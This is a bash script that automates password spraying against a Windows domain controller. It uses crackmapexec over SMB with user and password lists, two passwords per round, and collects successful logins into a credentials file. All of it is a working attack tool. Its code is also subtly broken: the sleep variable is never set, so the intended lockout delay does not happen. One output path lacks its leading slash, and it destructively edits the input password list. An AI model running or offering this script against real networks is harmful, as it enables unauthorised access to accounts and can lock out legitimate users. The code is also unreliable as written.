#!/bin/bash

#usage : ./spraygun.sh dc-ip userlist.txt passwords.txt sleep-in-mins (2x per sleep) 

#script to auto-spray with cme

#add if loop to check for crackmapexec new (bane or 6.0)

# $1 - dc-ip
# $2 - user list
# $3 - password list
# $4 - sleep timer
# $5 - outlog file (not yet)

#<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>


count=$(wc -l < $3)

while [ $count -gt 0 ]; do
	echo "Starting password spray with 2x every $4"
	
	head -n $count $3 > tmp.txt
	
	for pass in $(cat tmp.txt | head -2); do
		
		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log /home/kali/Documents/sprays/spraygun.txt
		echo $pass > /home/kali/Documents/sprays/used-passwords.txt

		sleep 10

	done
	
	echo "Found creds: "
	cat /home/kali/Documents/sprays/spraygun.txt | grep -ai '[+]' | tee -a home/kali/Documents/sprays/creds.txt
	
	sed -i "1,2d" $3
	
	count=$(wc -l < $3)
	$sleep_timer
done

echo "End of file, check your creds!"
